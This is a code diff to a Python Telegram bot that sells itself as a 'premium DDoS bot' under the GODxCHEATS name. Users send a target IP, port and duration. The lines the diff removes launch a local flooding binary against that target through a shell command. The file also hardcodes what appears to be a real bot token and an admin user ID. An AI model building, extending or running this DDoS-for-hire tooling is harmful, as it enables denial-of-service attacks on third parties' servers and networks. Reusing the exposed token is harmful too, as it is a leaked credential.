@@ -4,15 +4,15 @@ from telegram.ext import Application, CommandHandler, CallbackContext
 import os
 
 # Configuration
-TELEGRAM_BOT_TOKEN = ("7140094105:AAEcteoZXkxDKcv97XhGhkC-wokOUW-2a6k")  # Fetch token from environment variable
-ADMIN_USER_ID = 1662672529
+TELEGRAM_BOT_TOKEN = "7140094105:AAEcteoZXkxDKcv97XhGhkC-wokOUW-2a6k"  # Your bot token
+ADMIN_USER_ID = 1662672529  # Admin Telegram User ID
 APPROVED_IDS_FILE = 'approved_ids.txt'
-CHANNEL_ID = "https://t.me/+03wLVBPurPk2NWRl"  # Replace with your channel username
+CHANNEL_ID = "@https://t.me/+03wLVBPurPk2NWRl"  # Replace with your channel username (e.g., @MyChannel)
 attack_in_progress = False
 
 # Check if the token is set
 if not TELEGRAM_BOT_TOKEN:
-    raise ValueError("TELEGRAM_BOT_TOKEN environment variable not set. Please set the token and try again.")
+    raise ValueError("TELEGRAM_BOT_TOKEN is not set. Please provide a valid token.")
 
 # Load and Save Functions for Approved IDs
 def load_approved_ids():
@@ -40,7 +40,9 @@ async def is_member_of_channel(user_id: int, context: CallbackContext):
     try:
         member = await context.bot.get_chat_member(chat_id=CHANNEL_ID, user_id=user_id)
         return member.status in ["member", "administrator", "creator"]
-    except Exception:
+    except Exception as e:
+        # Handle errors (e.g., if user is not a member or channel ID is incorrect)
+        print(f"Error checking channel membership: {e}")
         return False
 
 # Commands
@@ -48,7 +50,7 @@ async def start(update: Update, context: CallbackContext):
     """Send a welcome message to the user."""
     chat_id = update.effective_chat.id
     message = (
-        "*WELCOME TOGODxCHEATS DDOS*\n\n"
+        "*WELCOME TO GODxCHEATS DDOS*\n\n"
         "*PRIMIUM DDOS BOT*\n"
         "*Owner*: @GODxAloneBOY\n"
         f"🔔 *Join our channel*: {CHANNEL_ID} to use advanced features.\n\n"
@@ -155,33 +157,6 @@ async def attack(update: Update, context: CallbackContext):
         f"*🔌 Port:* {port}\n"
         f"*⏱ Time:* {time} seconds\n"
     ), parse_mode='Markdown')
-
-    asyncio.create_task(run_attack(chat_id, ip, port, time, context))
-
-async def run_attack(chat_id, ip, port, time, context):
-    """Simulate an attack process."""
-    global attack_in_progress
-    attack_in_progress = True
-
-    try:
-        process = await asyncio.create_subprocess_shell(
-            f"./pushparaj {ip} {port} {time} 500",
-            stdout=asyncio.subprocess.PIPE,
-            stderr=asyncio.subprocess.PIPE
-        )
-        stdout, stderr = await process.communicate()
-
-        if stdout:
-            print(f"[stdout]\n{stdout.decode()}")
-        if stderr:
-            print(f"[stderr]\n{stderr.decode()}")
-
-    except Exception as e:
-        await context.bot.send_message(chat_id=chat_id, text=f"*⚠️ Error during the attack: {str(e)}*", parse_mode='Markdown')
-
-    finally:
-        attack_in_progress = False
-        await context.bot.send_message(chat_id=chat_id, text="*♥️ Attack Finished ♥️*", parse_mode='Markdown')
 
 # Main Function
 def main():
